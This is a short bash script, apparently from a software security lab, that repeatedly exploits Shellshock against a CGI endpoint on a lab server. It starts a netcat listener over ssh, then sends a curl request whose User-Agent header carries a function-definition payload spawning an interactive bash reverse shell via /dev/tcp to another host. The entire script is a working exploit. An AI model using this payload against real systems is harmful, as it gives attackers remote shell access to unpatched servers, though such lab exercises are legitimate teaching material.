#!/bin/bash


for i in $(eval echo {$1..$2})
do
curl -k https://10.176.147.83/guestbook.html
sleep 3
ssh -i ./server.pem softseclab@10.176.147.83 nc -l -p 8000 &
sleep 2 
curl -k -A "() { :; }; /bin/bash -i >& /dev/tcp/10.0.3.1/8000 0>&1" https://10.176.147.83/cgi-bin/ss

ssh -i ./server.pem softseclab@10.176.147.83 sudo killall -s SIGINT nc


done


